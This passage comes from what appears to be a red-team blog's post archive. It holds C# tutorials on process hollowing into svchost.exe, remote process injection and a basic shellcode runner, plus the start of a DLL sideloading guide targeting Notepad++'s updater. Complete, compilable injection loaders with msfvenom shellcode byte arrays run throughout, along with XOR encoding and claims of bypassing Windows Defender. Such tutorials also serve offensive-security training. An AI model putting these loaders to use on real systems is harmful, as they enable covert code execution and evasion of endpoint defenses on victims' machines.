STARTUPINFO{ public Int32 cb; public string lpReserved; public string lpDesktop; public string lpTitle; public Int32 dwX; public Int32 dwY; public Int32 dwXSize; public Int32 dwYSize; public Int32 dwXCountChars; public Int32 dwYCountChars; public Int32 dwFillAttribute; public Int32 dwFlags; public Int16 wShowWindow; public Int16 cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError;}[StructLayout(LayoutKind.Sequential)]public struct PROCESS_INFORMATION{ public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId;}public static class CreationFlags{ public const uint SUSPENDED = 0x4;}public const int PROCESSBASICINFORMATION = 0;These can be found here PROCESS_BASIC_INFORMATION STARTUPINFO PROCESS_INFORMATIONMain MethodNow that we have the imports and structs set we can get into it. First we will create our process in a suspended state. The process can be anything for a POC but use something that would be less sus to avoid detections. We also need to initialize some objects that we are going to use late.PROCESS_INFORMATION proc_info = new PROCESS_INFORMATION();STARTUPINFO startup_info = new STARTUPINFO();PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();string path = @\"C:\\\\Windows\\\\System32\\\\svchost.exe\";bool procINIT = CreateProcess(null, path, IntPtr.Zero, IntPtr.Zero, false, CreationFlags.SUSPENDED, IntPtr.Zero, null, ref startup_info, ref proc_info);To make sure the process created sucessfully we can use a simple if statement and use procINITif (procINIT == true){ Console.WriteLine(\"[*] Process create successfully.\"); Console.WriteLine(\"[*] Process ID: {0}\", proc_info.dwProcessId);}else{ Console.WriteLine(\"[-] Could not create the process.\");}The process ID is fetched from the PROCESS_INFORMATION struct that we initialized.Paste the shellcode obtained from msfvenom now. Ill be using the calc popping shellcode again but this time I’ll also be XOR encrypting it using msfvenom. The command becomesmsfvenom -p windows/x64/exec CMD=calc.exe -f csharp EXITFUNC=thread --encrypt xor --encrypt-key zAnd the decrypting shellcode part isfor (int i = 0; i &lt; buf.Length; i++){ buf[i] = (byte)(buf[i] ^ (byte)'z');}Then we need to get the PEB or Process Environment Block of the process in suspended state. THe PEB is a memory structure that every process has and it comtains some interesting fields that we can use to calculate things like ImageBaseAddress, which is what we are going to do. But first we need to query the process to get the PEB Address and then add 0x10 offset to it to get the pointer to the base image address. We can get the PebAddress from the PROCESS_BASIC_INFORMATION struct that we have.For the API ZwQueryInformationProcess we will need a process handle, which we can retrieve from PROCESS_INFORMATION. The second parameter is procInformationClass which from the Microsoft Docs, we can set to 0 to get a pointer to the PEB structure. Then we can calculate the pointer to image base address with adding PEB Address and an offset of 0x10.uint retLength = 0;IntPtr procHandle = proc_info.hProcess;ZwQueryInformationProcess(procHandle, 0, ref pbi, (uint)(IntPtr.Size * 6), ref retLength);IntPtr imageBaseAddr = (IntPtr)((Int64)pbi.PebAddress + 0x10);Console.WriteLine(\"[*] Image Base Address found: 0x{0}\", imageBaseAddr.ToString(\"x\"));Now we need to write the actual shellcode into the entery point address for it to execute. We cant directly write to it because the address changes due to ASLR (Address Space Layout Randomization). So we need to calculate it for each process. That can be done by Calculating actual image base adress Calculating e_lfanew value Calculating Entrypoint Relative Virtual Address (RVA) Calculating EntryPoint RVA Calculating actual abslute entrypoint addressI know thats a lot. We will be using ReadProcessMemory to read the memory for these addresses and calculate them. First we will calculate the actual image base for executable address. We will be setting the base address bytes to 0x8 for x64 process. Then read the memory to those base address bytes of PEB to get the address we need. The 0 in BitConverter indicates the starting point. We are reading 8 bytes in as ToInt64. byte[] baseAddrBytes = new byte[0x8];IntPtr lpNumberofBytesRead = IntPtr.Zero;ReadProcessMemory(procHandle, imageBaseAddr, baseAddrBytes, baseAddrBytes.Length, out lpNumberofBytesRead);IntPtr execAddr = (IntPtr)(BitConverter.ToInt64(baseAddrBytes, 0)); After getting that, we will be reading the memory but this time to 0x200 bytes from the base address we just got to parse the PE structure. byte[] data = new byte[0x200];ReadProcessMemory(procHandle, execAddr, data, data.Length, out lpNumberofBytesRead); Then we can calculate the e_lfanew value which contains the PE Header at the offset of 0x3c. The value of e_lfanew is 4 bytes so we will be using ToUint32. uint e_lfanew = BitConverter.ToUInt32(data, 0x3C);Console.WriteLine(\"[*] e_lfanew: 0x{0}\", e_lfanew.ToString(\"X\")); We can get the RVA offset by adding 0x28 into the e_lfanew value that we have which contains PE Header pointer. uint rvaOffset = e_lfanew + 0x28; We are going to read 4 bytes into the RVA offset to get the offset of the executable entrypoint address uint rva = BitConverter.ToUInt32(data, (int)rvaOffset); Finally we can add RVA and the base address to get the absolute value of the Entrypoint Address that we can write our shellcode to. IntPtr entrypointAddr = (IntPtr)((UInt64)execAddr + rva);Console.WriteLine(\"[*] Entrypoint Found: 0x{0}\", entrypointAddr.ToString(\"X\")); Now that we have the address we need we can write our shellcode in it using WriteProcessMemory. We are going to give it the process handle, the entrypoint address we want to write to, the buf which contains the shellcode which we are writing, and the length. IntPtr lpNumberOfBytesWritten = IntPtr.Zero;WriteProcessMemory(procHandle, entrypointAddr, buf, buf.Length, ref lpNumberOfBytesWritten); Once that is done we can resume the thread that we had suspended at the start using ResumeThread. We need to give it a thread handle which we can again retrive from the PROCESS_INFORMATION struct. IntPtr threadHandle = proc_info.hThread;ResumeThread(threadHandle); If everything went well you should have execution of your shellcode. If not look at your code again or you can always contact me and I’ll be happy to help. CodeYou can find the code at my github here. I have some other functionalities like sleep, courtesy of Snovvcrash whose code is here. Also made the code look a bit less shitty. There is also a obfucated version present here which was obfuscated using Rosfuscator by Melvin Langvik. Works pretty well. I aslo have a powershell script that pulls the executable from the web if not touching disk is your thing. Pretty basic for now. Will be making it like PowerSharpPack soon.ConclusionLet me know if you need help or whatever. My socials are at the bottom left. If there’s any mistakes or something I missed please reach out. This is basic but still executed my shellcode with Defender active. But you can always built upto it with encrypted shellcodes, or not having shellcode at all and fetching it from the web etc. Ill leave that to the reader. If some things might sound new to you I do recommend reading the PE Structure which would help you understand the terms like e_lfanew.ReferencesAll credits to these amazing posts and code which I constantly found myself reading. Snovvcrash Process Hollowing Cas Van Cooten Process Hollowing Michael Gorelik ProcessHollow" }, { "title": "Shellcode Injection in C# - Part 1 - Process Injection", "url": "/posts/Shellcode-Injection-Techniques/", "categories": "", "tags": "Red Team", "date": "2022-09-02 00:00:00 +0500", "snippet": "IntroductionIn the previous post we discussed how we can use WinAPI in C# and call funtions that we can use to build our red team tools. See the post here In this post we will look into how we can use C# to see other ways of shellcode injections.Process InjectionFrom the previous shellcode runner, we saw how we can use the API calls in this order.In case of process injection we use these calls.We are going to open a process, allocate some memory into it, then write to that memory with our shellcode and then excute it with CreateRemoteThread.So instead of VirtualAlloc we are going to use VirtualAllocEx because it has the ability to allocate memory in other process’s address space. Similarly we are using WriteProcessMemory instead of Marshal.Copy because now we are writing to a remote process and CreateRemoteThread to create a thread in that process.We can first start to add our imports in. Using the same data conversion table,[DllImport(\"kernel32.dll\")]public static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, UInt32 dwProcessId);[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, UInt32 flAllocationType, UInt32 flProtect);[DllImport(\"kernel32.dll\")]public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref int lpNumberOfBytesWritten);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref int lpThreadId);After the imports we can put our enums in place. We need to put the flAllocationType as MEM_COMMIT and MEM_RESERVE. The flProtect will remain the same as RWX or PAGE_EXECUTE_READWRITE and we will have a dwDesiredAccess for OpenProcess call which would specify what are the access levels we want to open the process with. The values for it can be found on the Microsoft Docs here. These enums becomepublic enum State{ MEM_COMMIT = 0x00001000, MEM_RESERVE = 0x00002000}public enum Protection{ PAGE_EXECUTE_READWRITE = 0x40}public enum Process{ PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFFF, PROCESS_CREATE_THREAD = 0x0002, PROCESS_QUERY_INFORMATION = 0x0400, PROCESS_VM_OPERATION = 0x0008, PROCESS_VM_READ = 0x0010, PROCESS_VM_WRITE = 0x0020}With these out of the way we can start with our Main method. First we are going to create our dwDesiredAccess. We can use PROCESS_ALL_ACCESS or we can use the other ones likevar desiredAccess = Process.PROCESS_CREATE_THREAD | Process.PROCESS_QUERY_INFORMATION | Process.PROCESS_VM_OPERATION | Process.PROCESS_VM_READ | Process.PROCESS_VM_WRITE;Next we can add in our shellcode. I’m using a calc.exe x64 shellcode I generated from msfvenom.// msfvenom -p windows/x64/exec CMD=calc.exe -f csharpbyte[] buf = new byte[276] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 };We need to initialize some values like the shellcode size.int shellcode_size = buf.Length;int bytesWritten = 0;int lpthreadID = 0;When all these values are set we can start with calling APIs. First one we will be using is OpenProcess to open the process. It takes three arguments. The desired access, inherit handle and the process ID. We already have the desired access variable set that we can use. We dont need a inherit handle because we dont want this process to be inherited by a child process and the process ID is something we can give on the command line.IntPtr procHandle = OpenProcess((uint)desiredAccess, false, Convert.ToUInt32(args[0]));Now we can allocate some memory into the process. Like we did in the shellcode runner,IntPtr init = VirtualAllocEx(procHandle, IntPtr.Zero, shellcode_size, (uint)State.MEM_COMMIT | (uint)State.MEM_RESERVE, (uint)Protection.PAGE_EXECUTE_READWRITE);Then we can write to that process’s memory using WriteProcessMemory. The handle of the process is defined with the OpenProcess call. The base address will be the start of the memory we allocated using VirtualAllocEx. The buffer is the shellcode bytes, the size is the length of shellcode and the bytesWritten are already initialized. We can also see how many bytes get written.WriteProcessMemory(procHandle, init, buf, shellcode_size, ref bytesWritten);Console.WriteLine(\"[*] Bytes Written: {0}\", bytesWritten);Lastly we will use CreateRemoteThread to create a thread for our shellcode annd execute it. We provide it with the process handle, the thread attributes are set to zero. According to Microsoft Docs, It member of the structure specifies a security descriptor for the new thread. If lpThreadAttributes is NULL, the thread gets a default security descriptor. The dwStackSize is zero which sets the default size. We dont have any parameters so that becomes zero as well and we are going to be printing the thread ID.IntPtr threadPTR = CreateRemoteThread(procHandle, IntPtr.Zero, 0, init, IntPtr.Zero, 0, ref lpthreadID);Console.WriteLine(\"[*] Thread ID: {0}\", lpthreadID);Putting it all together gives us this.[DllImport(\"kernel32.dll\")]public static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, UInt32 dwProcessId);[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, UInt32 flAllocationType, UInt32 flProtect);[DllImport(\"kernel32.dll\")]public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref int lpNumberOfBytesWritten);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref int lpThreadId);public enum State{ MEM_COMMIT = 0x00001000, MEM_RESERVE = 0x00002000}public enum Protection{ PAGE_EXECUTE_READWRITE = 0x40}public enum Process{ PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFFF, PROCESS_CREATE_THREAD = 0x0002, PROCESS_QUERY_INFORMATION = 0x0400, PROCESS_VM_OPERATION = 0x0008, PROCESS_VM_READ = 0x0010, PROCESS_VM_WRITE = 0x0020}static void Main(string[] args){ var desiredAccess = Process.PROCESS_CREATE_THREAD | Process.PROCESS_QUERY_INFORMATION | Process.PROCESS_VM_OPERATION | Process.PROCESS_VM_READ | Process.PROCESS_VM_WRITE; byte[] buf = new byte[276] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52, 0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48, 0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9, 0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41, 0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48, 0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01, 0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48, 0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0, 0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c, 0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0, 0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04, 0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59, 0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48, 0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f, 0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff, 0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb, 0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c, 0x63,0x2e,0x65,0x78,0x65,0x00 }; int shellcode_size = buf.Length; int bytesWritten = 0; int lpthreadID = 0; IntPtr procHandle = OpenProcess((uint)desiredAccess, false, Convert.ToUInt32(args[0])); IntPtr init = VirtualAllocEx(procHandle, IntPtr.Zero, shellcode_size, (uint)State.MEM_COMMIT | (uint)State.MEM_RESERVE, (uint)Protection.PAGE_EXECUTE_READWRITE); WriteProcessMemory(procHandle, init, buf, shellcode_size, ref bytesWritten); Console.WriteLine(\"[*] Bytes Written: {0}\", bytesWritten); IntPtr threadPTR = CreateRemoteThread(procHandle, IntPtr.Zero, 0, init, IntPtr.Zero, 0, ref lpthreadID); Console.WriteLine(\"[*] Thread ID: {0}\", lpthreadID);}We can take a process ID from Task Manager. And executing it gives us.A cleaner and improvered version can be found here. The x86 shellcode part doesnt work btw (yet)." }, { "title": "WinAPI and P/Invoke in C#", "url": "/posts/WinAPI-and-PInvoke-in-CSharp/", "categories": "", "tags": "Red Team", "date": "2022-08-31 00:00:00 +0500", "snippet": "IntroductionC# can be a very useful language to start building your initial red team toolkit in. Understandably, it does not provide the covert-ness (not sure if thats an actual word) that we can use in languages like C or C++. But it has other aspects like in memory execution and with the increase in tools that use C# we have also seen some cool tactics that can be utilized to bypass detection and defenses in out red team engagements.This blog post will cover basics of using our managed code so we can run Windows API calls. But we should first know what managed and unmanaged code means.Managed and Unmanaged CodeC# is a Object Oriented language that is based on the .NET Framework which is made by Microsoft. The syntax is quite easy to understand and learn. There are two general terms which you will hear: Unmanaged Code. Managed Code.In case of unmanaged code, as Microsoft says, the programmer is in-charge or everything. Everything from memory management, garbage collection, exception handling and security considerations like protections from buffer overflow attacks is the headache of the programmer. It compiles directly into native language that the OS can run directly and also provides low level access to programmer.For managed code, the code managed by a CLR (Common Language Runtime) in the .NET Framework. The CLR takes the code and compiles into intermediate language known as IL. It is then compiled by the runtime and executed. It also provides automatic memory management, security protections, garbage collection and exception handling etc.For better understanding, take a look at this picture.When using C#, sometimes we need to access the power of unmanaged code from our managed code. We can create a bridge between managed and unmanaged code of ours thanks to the functionality of interopability that the CLR provides. This interopability is made possible with the use of P/Invoke!P/InvokePlatform Invoke or otherwise known as P/Invoke is what helps us use unsafe or unmanaged code from unmanaged libraries into our managed code. According to Microsoft, P/Invoke is a technology that allows you to access structs, callbacks, and functions in unmanaged libraries from your managed code. Most of the P/Invoke API is contained in two namespaces: System and System.Runtime.InteropServices. Using these two namespaces give you the tools to describe how you want to communicate with the native component.Using WinAPI to call a MessageBoxLet’s look at an example. We can take a unmanaged API call like MessageBox and see what sytax it uses.We can see some things dont make sense here. We dont have HWND or LPCTSTR in C# that we can use. For this we can convert the data types to something we are familiar in C#. A data type conversion chart is found here. This post by Matt Hand at SpecterOps is also pretty great at explaining the same things I’m rambling about. The chart mentioned in the blog is:So if we take this in account we can have something similar to thisint MessageBox( IntPtr hWnd, string lpText, string lpCaption, uint uType);But how do we actually use it? We need to use the DllImport to import the DLL which has the unmanaged code for us to use. We can find what DLL we have to use form the Microsoft Docs about the MessageBox function. For us it is the User32.dll. We can import this DLL by using[Dllimport(\"user32.dll\")]public static extern MessageBox(IntPtr hWnd, string lpText, string lpCaption, uint uType);In line 2 of the above code, we mention the extern or external code that we want to use (MessageBox) with the syntax that we converted earlier.Putting all this together we get:// First we use the two namespaces that Microsoft mentioned.using System;using System.Runtime.InteropServices;namespace demo{ class Program { // Here we import our DLL that holds our `MessageBox` Function. [DllImport(\"user32.dll\")] public static extern int MessageBox(IntPtr hWnd, string lpText, string lpCaption, uint uType); static void Main(string[] args) { // Now we can call it using our required parameters. MessageBox(IntPtr.Zero, \"Hey there!\", \"Hello from P/Invoke!\", 0); } }}When we compile and run it:Voila! WinAPI accomplished!Creating a Shellcode RunnerNow that we know how to pop a message box using WinAPI let’s discuss how we can use it to make a simple shellcode loader. Too fast? You are free to do some research and explore the WinAPI more and then follow along later. This post considers that you already have some understanding of C# and it’s syntax so I’m just going to dive in.As from before, we will need to know the imports we are making. For our simple shellcode runner, we need 3 APIs. VirtualAlloc to allocate memory, CreateThread to, you guessed it, create a thread and WaitForSingleObject to wait for the thread to exit. We can import them as:[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, UInt32 flAllocationType, UInt32 flProtect);[DllImport(\"kernel32.dll\")]private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);[DllImport(\"kernel32.dll\")]private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);The syntax is taken from the Microsoft Docs and is converted using the Data Conversion photo from Matt Hand.Now before going into the Main method and start working in the shellcode, we need to create some enums. These enums will hold our data that will remain constant. In the first import VirtualAlloc we can see two things, flAllocationType and flProtect. According to the Microsoft Docs of this function, the first is the memory allocation type and the other is the memory protection for the region of pages to be allocated. What we need is the memory allocation type to be MEM_COMMIT to commit the memory space and the protection to be PAGE_EXECUTE_READWRITE so we can put our shellcode in and then execute it. So for these two we can create enums.public enum TYPE{ MEM_COMMIT = 0x00001000}public enum PROTECTION{ PAGE_EXECUTE_READWRITE = 0x40}Now on to our Main method. We can start by initializing a C# byte array of our payload. For simplicity, I will be using a simple msfvenom generated payload that pops calculator.// msfvenom -p windows/exec CMD=calc.exe -f csharpbyte[] buf = new byte[193] { 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30, 0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff, 0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52, 0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1, 0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b, 0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03, 0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b, 0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24, 0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb, 0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f, 0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5, 0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a, 0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 };As that is sorted now we can use our APIs to execute it. First we use VirtualAlloc to allocate some memory for our shellcode. The address is going to be zero because we are just starting it, the size needs to be equal to the size of shellcode, aloocation needs to be MEM_COMMIT, and the protection should be PAGE_EXECUTE_READWRITE. So this becomes:int shellcode_size = buf.Length;IntPtr init = VirtualAlloc(IntPtr.Zero, shellcode_size, (UInt32)TYPE.MEM_COMMIT, (UInt32)PROTECTION.PAGE_EXECUTE_READWRITE);Now that the memory space is allocated we can use Marshal.Copy to put our shellcode in the place. It takes 4 arguments, The byte array of our shellcode, the starting index, the destination and the size.Marshal.Copy(buf, 0, init, shellcode_size);Next step is to execute the shellcode. We do that by using CreateThread. Before it we need to initialize some things for it to use. Then we can use it as:IntPtr hThread = IntPtr.Zero;UInt32 threadId = 0;IntPtr pinfo = IntPtr.Zero;hThread = CreateThread(0, 0, (UInt32)init, pinfo, 0, ref threadId);Lastly we will use WaitForSingleObject to make our thread wait for infinite number of time.WaitForSingleObject(hThread, 0xFFFFFFFF);When we put all of that together we get:using System;using System.Runtime.InteropServices;namespace demo{ class Program { [DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32.dll\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32.dll\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); static void Main(string[] args) { byte[] buf = new byte[193] { 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30, 0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff, 0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52, 0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1, 0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b, 0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03, 0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b, 0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24, 0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb, 0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f, 0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5, 0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a, 0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 }; int shellcode_size = buf.Length; IntPtr init = VirtualAlloc(IntPtr.Zero, shellcode_size, (UInt32)TYPE.MEM_COMMIT, (UInt32)PROTECTION.PAGE_EXECUTE_READWRITE); Marshal.Copy(buf, 0, init, shellcode_size); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, (UInt32)init, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); } public enum TYPE { MEM_COMMIT = 0x00001000 } public enum PROTECTION { PAGE_EXECUTE_READWRITE = 0x40 } }}Compiling and running it gives us:We get our shellcode running and poping calculator.ConclusionThis was a small introduction to Windows API and C# and how we can use both of them to create red team tools for ouir use. This is however very basic and will get detected or blocked. In the next post I’ll mention some methods we can use to enhance this and make something that would help us bypass certain type of defenses.ReferencesThanks to all of these which I heavily referenced from. CLR Execution Model Managed VS. Unmanaged Code Managed Code - Microsoft Operational Challenges in Offensive C# Working with WIN32 API in .NET P/Invoke Offensive P/Invoke: Leveraging the Win32 API from Managed Code Red Team Tactics: Utilizing Syscalls in C# - Prerequisite Knowledge" }, { "title": "Guide to DLL Sideloading", "url": "/posts/DLL-Sideloading/", "categories": "", "tags": "Red Team", "date": "2022-07-21 00:00:00 +0500", "snippet": "IntroductionDLL Sideloading is a technique related to DLL Hijacking. Its similar to search order hijacking but instead of dropping a malicious DLL, in this technique we drop a legitimate DLL and a malicious DLL. The malicious DLL loads our shellcode and then forwards every other call to the legitimate DLL. This way program gets executed as normal (unlike other DLL hijacking methods which mostly result in crashing the program) and our shellcode gets executed as well.It’s kind of a hit or miss thing. At least from what I’ve experienced. Finding the perfect DLL to attack, the application to attack all takes a lot of trial and error. To keep things simple I will not be going into protecting the payload or delivery mechanism or any of the advanced areas. I’ll just be showing you how one can do this type of attack and why it seems so interesting (at least to me xd).Recently the team at Palo Alto Networks Unit 42 released a blog documenting the TTPs of APT29 and how they used the DLL Search Order Hijacking and DLL Sideloading to attack users which you can read here. This and a really cool blog post from Sunggwan Choi which can be found here spiked my interest and I wanted to showcase how I have been testing it out with the C2 sliver. I’m not that pro yet but still this method seems really good so let’s look into it.The IdeaSo after a lot of trail and error I found out that the Notepad++ app has a updater file GUP.exe that is vulnerable. That said, I did try a lot of apps, mainly I wanted to test Microsoft Signed binaries but I couldn’t get them to work (yet?). But this one seemed to work. The idea behind it is that we create a copy of the original DLL and a malicious DLL with our shellcode in it. When the program gets executed, our malicious DLL gets loaded triggering our shellcode. But at the same time, notmal calls that the binary will be making are forwarded to the original DLL like a “proxy” which makes the execution of the program successful. Which is also why it is mentioned as DLL Proxying in some cases. This has been tested to completely bypass Windows Defender on my testing machine as well.MethodologyThe simple sequence 